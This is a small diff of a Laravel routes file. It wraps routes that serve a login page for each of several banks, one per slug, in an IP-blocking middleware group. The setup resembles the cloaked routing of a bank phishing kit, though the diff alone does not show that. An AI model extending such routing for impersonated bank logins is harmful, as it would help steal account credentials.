@@ -13,8 +13,10 @@ Route::get('/info', function () {
 
 require __DIR__.'/auth.php';
 
-foreach (BankLoginController::ACTIVE_SLUGS as $slug) {
-    Route::get('/'.$slug, [BankLoginController::class, 'show'])
-        ->defaults('bankSlug', $slug)
-        ->name('bank-login.'.$slug);
-}
+Route::middleware(['blocked.ip'])->group(function () {
+    foreach (BankLoginController::ACTIVE_SLUGS as $slug) {
+        Route::get('/' . $slug, [BankLoginController::class, 'show'])
+            ->defaults('bankSlug', $slug)
+            ->name('bank-login.' . $slug);
+    }
+});
